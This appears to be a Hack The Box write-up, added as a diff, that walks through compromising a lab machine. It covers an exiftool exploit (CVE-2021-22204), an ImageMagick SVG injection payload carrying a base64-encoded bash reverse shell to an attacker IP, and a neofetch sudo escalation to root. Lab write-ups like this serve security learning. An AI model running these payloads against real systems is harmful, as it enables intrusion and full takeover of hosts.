@@ -1,0 +1,74 @@
+ip : 10.10.11.140
+domain : artcorp.htb dev01.artcorp.htb
+
+- nmap revealed that 2 ports are open 22 and 80
+- visiting 80 we didnt get any result 
+- directory brute forcing with wfuzz we get several directories but nothing of much interest to us
+- sub domain enumeration with wfuzz gives us dev01
+- adding both artcorp.htb from the nmap scan and dev01.artcorp.htb to /etc/hosts
+
+- visiting artcorp.htb shows a default site 
+- visiting the dev01.artcorp.htb shows a link to an image uploading portal called metaview
+- we tried uploading an image and the result shows the meta data 
+- the application returns a subset of the metadata as output 
+- the following application is vulnerable to CVE-2021-22204
+- getting the exploit from the github
+	$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool
+
+- download the dependencies 
+	sudo apt install djvulibre-bin exiftool
+
+- setup a listener with nmap
+	nc -nvlp 9001
+
+- run the exploit 
+	python3 exploit.py
+
+- an image file will be saved to our machine
+- upload the image file and run it through metaview to get a shell
+- we got a shell as www-data
+
+Shell as thomas
+---------------
+- upload pspy64 to the victim machine and run it to review the processes running behind the scenes 
+- pspy64 found that convert_image.sh in the location /usr/local/bin is being executed in every minute by thomas
+- checking the contents of convert_image.sh shows that its running mogrify command to convert each uploaded file to a png 
+- checking the version of mogrify found that imagemagick is a part of it and is vulnerable to command injection vulnerability
+- to exploit this create a file named poc.svg with contents
+
+	<image authenticate='ff" `echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvMTMzNyAwPiYxIA==" | base64 -d | bash`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="msl:mog-shell.svg" height="100" width="100"/>
+  </svg>
+</image>
+
+- start a listener
+	nc -nvlp 1337
+
+- wait for the reverse shell
+- we got a shell as thomas 
+- for more stable shell we can copy the ssh key of thomas and ssh into the machne with the ssh key
+- now we have a stable shell
+- grab the user flag
+
+Priv-esc
+--------
+- checking sudo -l shows that thomas can run neofetch as root
+- but with the way its setup we cant pass any arguments to neofetch
+- checking gtfobins for a possible exploit for neofetch and found one 
+- but itll need a config file 
+- the neofetch uses the config file inside thomas to execute and return result
+- the sudo -l shows that $XDG_CONFIG_HOME is also set
+- checking the contents of $XDG_CONFIG_HOME returns nothing 
+- we can exploit this as follows
+
+	$ export XDG_CONFIG_HOME="$HOME/.config"
+	$ echo "exec /bin/bash" >> /home/thomas/.config/neofetch/config.conf
+	$ sudo /usr/bin/neofetch \"\"
+
+- we get a shell as root 
+- grab the root flag
